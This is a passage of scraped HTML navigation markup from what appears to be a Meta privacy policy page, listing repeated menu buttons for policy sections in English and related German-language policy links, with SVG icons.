                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we transmit information?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we respond to official requests, comply with applicable laws, and prevent harm?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How will you know when the policy changes?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How to ask Meta questions?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Why and how we process your data</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">What is the Privacy Policy and what does it cover?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">What information do we collect?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we use your information?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we share your information on Meta Products or with integrated partners?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we share information with third parties?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How is the cooperation between Meta Companies organized?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How can you manage or delete your information and exercise your rights?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How long do we keep your information?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we transmit information?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we respond to official requests, comply with applicable laws, and prevent harm?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How will you know when the policy changes?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How to ask Meta questions?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Why and how we process your data</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">What is the Privacy Policy and what does it cover?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">What information do we collect?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we use your information?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we share your information on Meta Products or with integrated partners?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we share information with third parties?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How is the cooperation between Meta Companies organized?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How can you manage or delete your information and exercise your rights?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How long do we keep your information?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we transmit information?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How do we respond to official requests, comply with applicable laws, and prevent harm?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How will you know when the policy changes?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">How to ask Meta questions?</div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">Why and how we process your data</div>
                      <div class="action-button-arrow">
                      </div>
                    </div></div>
                        <div class="action-button collapsed" data-bs-toggle="collapse" data-bs-target="#RulesCollapse" aria-expanded="false" aria-controls="RulesCollapse">
                            <div class="action-button-img">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="x1lliihq x1k90msu x2h7rmj x1qfuztq x198g3q0 xxk0z11 xvy4d1p">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm0-13.702c.483 0 .875.391.875.875V17a.875.875 0 0 1-1.75 0v-6.827c0-.484.392-.875.875-.875zm0-1.275c.833 0 1.25-.405 1.25-1.012C13.25 6.405 12.833 6 12 6s-1.25.405-1.25 1.011c0 .607.417 1.012 1.25 1.012z">
                                    </path>
                                </svg>
                            </div>
                            <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
                                Andere Regeln und Artikel
                            </font></font></font></font></font></font></div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="ARROW">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M4.341 7.247a1 1 0 0 1 1.412.095L12 14.482l6.247-7.14a1 1 0 0 1 1.506 1.317l-7 8a1 1 0 0 1-1.506 0l-7-8a1 1 0 0 1 .095-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="collapse" id="RulesCollapse" style="">
                        <div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
